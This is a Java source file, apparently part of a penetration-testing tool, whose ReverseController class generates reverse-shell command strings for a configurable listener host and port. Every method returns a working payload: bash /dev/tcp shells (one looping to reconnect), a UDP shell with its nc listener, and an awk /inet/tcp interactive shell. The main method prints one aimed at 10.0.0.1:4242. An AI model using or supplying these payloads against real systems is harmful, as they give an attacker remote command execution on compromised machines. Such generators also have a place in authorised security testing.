package com.swordHostDemo.controller;

import com.swordHostDemo.pojo.menuBeanListener;

/**
 * @date: 2022/12/29 20:30
 * @description:
 */
public class ReverseController {


    public static String ReverseBashTCP1() {
        String str = "bash -i >& /dev/tcp/" + menuBeanListener.getLhost() + "/" + menuBeanListener.getLport() + " 0>&1";

        System.out.println("ReverseBashTCP1：" + str);
        return str;
    }

    public static String ReverseBashTCP2() {
        String str = "0<&196;exec 196<>/dev/tcp/" + menuBeanListener.getLhost() + "/" + menuBeanListener.getLport() + "; sh <&196 >&196 2>&196";
        return str;
    }

    public static String ReverseBashTCP3() {
        String str = "/bin/bash -l > /dev/tcp/" + menuBeanListener.getLhost() + "/" + menuBeanListener.getLport() + " 0<&1 2>&1";
        return str;
    }

    public static  String ReverseBashTCP4(){
        String str = "bash -c \"while true; do bash -i >& /dev/tcp/" + menuBeanListener.getLhost() + " /" + menuBeanListener.getLport() + "  0>&1; sleep 2; done\"";
        return str;
    }

    public static String ReverseBashUDPVictim() {
        String str = "sh -i >& /dev/udp/" + menuBeanListener.getLhost() + "/" + menuBeanListener.getLport() + " 0>&1";
        return str;
    }

    public static String ReverseBashUDPListener() {
        String str = "nc -u -lvp " + menuBeanListener.getLport();
        return str;
    }

    public static String ReverseAWKString1() {
        String str = "awk 'BEGIN {s = \"/inet/tcp/0/"+menuBeanListener.getLhost()+"/"+menuBeanListener.getLport()+"\"; while(42) { " +
                "do{ printf \"shell>\" |& s; s |& getline c; if(c){ while ((c |& getline) >" +
                " 0) print $0 |& s; close(c); } } while(c != \"exit\") close(s); }}' /dev/null";
        return str;
    }

    public static void main(String[] args) {
        menuBeanListener.setLhost("10.0.0.1");
        menuBeanListener.setLport("4242");
        System.out.println(ReverseAWKString1());
    }


}
